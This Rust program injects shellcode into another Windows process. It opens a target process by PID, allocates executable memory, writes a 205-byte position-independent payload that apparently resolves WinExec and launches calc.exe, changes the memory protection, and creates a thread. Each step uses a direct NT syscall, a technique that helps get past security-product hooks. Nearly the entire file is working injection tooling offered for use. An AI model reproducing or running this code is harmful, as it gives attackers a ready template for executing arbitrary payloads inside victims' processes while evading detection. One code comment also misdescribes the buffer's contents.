#![allow(non_snake_case)]
use ntapi::ntapi_base::CLIENT_ID;

use rust_syscalls::syscall;
use windows::Win32::System::Threading::{CREATE_SUSPENDED, THREAD_ALL_ACCESS};

use std::mem::size_of;
use std::ptr::null_mut;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES, PVOID};
use winapi::um::winnt::{
    PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
    PROCESS_VM_WRITE,
};

fn main() {
    let pid: u64 = 24448; // Example PID, replace with a valid PID
                          // Declare a buffer to store 0xDE, 0xAD, 0xBE, 0xEF
    let mut buffer: [u8; 205] = [
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18,
        0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
        0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff,
        0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
        0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01,
        0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59,
        0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41,
        0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
        0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01,
        0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91,
        0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0,
        0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8,
        0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1,
        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
    ];

    let mut process_handle: HANDLE = NULL;
    let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as _,
        RootDirectory: NULL,
        ObjectName: NULL as _,
        Attributes: 0,
        SecurityDescriptor: NULL,
        SecurityQualityOfService: NULL,
    };

    let client_id = CLIENT_ID {
        UniqueProcess: pid as HANDLE,
        UniqueThread: 0 as HANDLE,
    };

    // Call to NtOpenProcess
    let status_open_process: NTSTATUS;
    unsafe {
        status_open_process = syscall!(
            "NtOpenProcess",
            &mut process_handle,
            PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD,
            &oa,
            &client_id
        );
    }

    println!("\n\t[-] NtOpenProcess status: {:#02X}", status_open_process);

    if status_open_process != winapi::shared::ntstatus::STATUS_SUCCESS {
        return;
    }

    // Call to NtAllocateVirtualMemory
    let mut base_address: PVOID = null_mut();
    let mut region_size: usize = buffer.len();
    let status_allocate_memory: NTSTATUS;
    unsafe {
        status_allocate_memory = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut base_address,
            0,
            &mut region_size,
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            // Write access to the allocated memory
            winapi::um::winnt::PAGE_EXECUTE_READWRITE
        );
    }

    println!(
        "\n\t[-] NtAllocateVirtualMemory status: {:#02X}",
        status_allocate_memory
    );

    if status_allocate_memory != winapi::shared::ntstatus::STATUS_SUCCESS {
        return;
    }

    // Call to NtWriteVirtualMemory
    let mut bytes_written: usize = 0;
    let status_write_memory: NTSTATUS;
    unsafe {
        status_write_memory = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            base_address,
            buffer.as_mut_ptr() as PVOID,
            buffer.len(),
            &mut bytes_written
        );
    }

    println!(
        "\n\t[-] NtWriteVirtualMemory status: {:#02X}",
        status_write_memory
    );
    // Print the address where the buffer was written
    println!("\n\t[-] Buffer written at: {:#02X}", base_address as u64);

    // Call to NtProtectVirtualMemory to change the memory protection to PAGE_EXECUTE_READ
    let mut old_protection: u32 = 0;
    let status_protect_memory: NTSTATUS;
    unsafe {
        status_protect_memory = syscall!(
            "NtProtectVirtualMemory",
            process_handle,
            &mut base_address,
            &mut region_size,
            winapi::um::winnt::PAGE_EXECUTE_READ,
            &mut old_protection
        );
    }

    println!(
        "\n\t[-] NtProtectVirtualMemory status: {:#02X}",
        status_protect_memory
    );

    println!(
        "\n\t[-] Creating Thread starting at {:#02X}",
        base_address as u64
    );

    // Call to NtCreateThreadEx
    let mut thread_handle: HANDLE = NULL;
    let status_create_thread: NTSTATUS;
    unsafe {
        status_create_thread = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            NULL,
            process_handle,
            base_address as PVOID,
            NULL,
            CREATE_SUSPENDED,
            0,
            0,
            0,
            NULL
        );
    }

    println!(
        "\n\t[-] NtCreateThreadEx status: {:#02X}",
        status_create_thread
    );
}
